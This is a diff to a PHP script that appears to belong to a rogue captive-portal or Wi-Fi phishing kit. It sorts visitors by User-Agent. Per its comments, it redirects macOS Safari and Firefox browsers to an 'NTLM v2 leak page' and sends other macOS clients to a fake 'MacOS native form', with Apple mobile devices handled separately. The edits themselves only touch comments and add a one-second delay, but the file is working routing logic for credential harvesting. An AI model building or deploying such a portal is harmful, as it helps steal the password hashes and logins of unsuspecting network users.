@@ -1,5 +1,6 @@
 <?php
     $user_agent = $_SERVER['HTTP_USER_AGENT'];
+    // echo $user_agent;
 
     if (preg_match("/i(Pad|Pod|Phone)/", $user_agent)) {
         //echo "<br/>This is Apple Mobile device";
@@ -7,12 +8,13 @@
     else {
         if (preg_match("/Mac OS/", $user_agent)) {
             if (preg_match("/(Safari|Firefox)/", $user_agent)) {
-                //echo "<br/>This is Apple Browser";
+                // echo "<br/>This is Apple Browser";
                 // redirect to NTLM v2 leak page
                 header("Location: /leak.php");
             }
             else {
-                //echo "<br/>This is Apple Captive form";
+                // echo "<br/>This is Apple Captive form";
+                sleep(1);
                 // redirect to MacOS native form
                 header("Location: /macos_native/");
             }
